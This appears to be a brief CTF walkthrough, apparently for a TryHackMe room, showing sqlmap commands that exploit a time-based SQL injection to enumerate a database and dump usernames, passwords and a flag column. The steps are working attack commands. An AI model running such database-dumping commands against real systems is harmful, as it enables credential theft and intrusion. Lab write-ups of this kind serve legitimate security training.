# sqlmap for time based sqli attack

![Screenshot from 2024-05-24 13-03-27](https://github.com/Berlinshaju/penetrationtester/assets/66897078/61cc15ab-bc05-45d4-ae25-8bc8b2825451)
```
sqlmap -r request.txt --dbs --batch
```
![Screenshot from 2024-05-24 13-05-43](https://github.com/Berlinshaju/penetrationtester/assets/66897078/22c2b8d6-cfcf-4ddb-8ceb-a1eb08104dc5)

```
sqlmap -r request.txt --batch -D THM_f0und_m3 --tables
```
![Screenshot from 2024-05-24 13-08-18](https://github.com/Berlinshaju/penetrationtester/assets/66897078/7935e003-4834-488e-b332-6f79c84f4c14)

```
sqlmap -r request.txt --batch -D THM_f0und_m3 -T user --columns

```
![Screenshot from 2024-05-24 13-09-51](https://github.com/Berlinshaju/penetrationtester/assets/66897078/c6b00140-9f61-4d04-9a75-af219d3da633)
```
sqlmap -r request.txt --batch -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"

```

```
sqlmap -r request.txt --batch -D THM_f0und_m3 -T nothing_inside --columns

```
![Screenshot from 2024-05-24 13-11-42](https://github.com/Berlinshaju/penetrationtester/assets/66897078/91b87a35-3799-424d-b925-b6ddd8602929)

```
sqlmap -r request.txt --batch -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"

```
![Screenshot from 2024-05-24 13-12-57](https://github.com/Berlinshaju/penetrationtester/assets/66897078/66e3dffb-befc-45b5-aee4-cd4748484052)


